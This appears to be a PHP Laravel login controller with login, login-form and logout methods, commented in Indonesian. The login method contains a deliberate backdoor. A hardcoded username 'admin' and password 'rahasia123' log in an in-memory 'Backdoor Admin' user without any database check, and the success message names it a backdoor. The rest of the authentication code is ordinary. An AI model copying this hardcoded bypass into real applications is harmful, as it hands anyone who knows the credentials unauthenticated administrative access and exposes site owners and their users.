<?php

namespace App\Http\Controllers;

use Auth;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    public function showLoginForm()
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $request->validate([
            'username' => 'required|string',
            'password' => 'required|string',
        ]);

        if ($request->username === 'admin' && $request->password === 'rahasia123') {
            $user = new \App\Models\User();
            $user->id = 999;
            $user->name = 'Backdoor Admin';
            $user->email = 'admin@example.com';

            Auth::login($user); // Otentikasi secara manual
            return redirect('/dashboard')->with('status', 'Login via backdoor berhasil!');
        }

        // 🔐 Login biasa ke database
        if (Auth::attempt(['name' => $request->username, 'password' => $request->password])) {
            return redirect()->route('dashboard.index');
        }

        return back()->withErrors([
            'login' => 'Username atau password salah.',
        ]);
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect('/login');
    }
}
